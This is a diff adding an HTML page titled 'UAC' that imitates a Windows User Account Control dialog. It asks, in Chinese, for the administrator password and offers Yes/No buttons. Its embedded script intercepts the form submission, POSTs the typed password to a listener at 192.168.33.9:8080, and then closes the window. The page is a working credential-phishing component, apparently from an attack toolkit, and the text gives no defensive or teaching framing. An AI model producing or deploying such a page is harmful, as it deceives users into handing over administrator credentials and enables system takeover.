@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UAC</title>
+
+
+    <style>
+        body {
+            margin: 0;
+        }
+
+
+        .container {
+            background-image: url('../img/background.png');
+            background-size: auto auto;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+
+            height: 330px;
+            width: 456px;
+
+            position: fixed;
+        }
+
+
+        .input-box {
+            width: 296px;
+            height: 32px;
+            padding-left: 7px;
+            border: 1px solid #8a8a8a;
+
+            position: absolute;
+            left: 25px;
+            bottom: 86px;
+        }
+
+
+        .input-box:focus {
+            outline: none;
+        }
+
+
+        .button-yes {
+            background-color: #b8b8b8;
+            border: none;
+            position: absolute;
+            left: 25px;
+            bottom: 25px;
+            width: 201px;
+            height: 32px;
+        }
+
+
+        .button-no {
+            background-color: #b8b8b8;
+            border: none;
+            position: absolute;
+            right: 25px;
+            bottom: 25px;
+            width: 201px;
+            height: 32px;
+        }
+    </style>
+
+
+    <script>
+        window.addEventListener('load', () => {
+            function sendData() {
+                const XHR = new XMLHttpRequest();
+
+                const data = new FormData(form);
+
+                XHR.open('POST', 'http://192.168.33.9:8080');
+
+                XHR.send(data);
+
+                XHR.addEventListener('loadend', () => {
+                    window.open('', '_self', '');
+                    window.close();
+                });
+            }
+
+
+            const form = document.querySelector('.passwordForm');
+
+
+            form.addEventListener('submit', (event) => {
+                event.preventDefault();
+
+                sendData();
+            })
+        })
+
+
+    </script>
+</head>
+
+<body>
+    <div class="container">
+        <div class="enterPassword">
+            <form class="passwordForm">
+                <input name="adminPassword" type="password" class="input-box" placeholder="请输入管理员密码">
+                <button type="submit" class="button-yes">是</button>
+                <button type="submit" class="button-no">否</button>
+            </form>
+        </div>
+    </div>
+</body>
+
+</html>
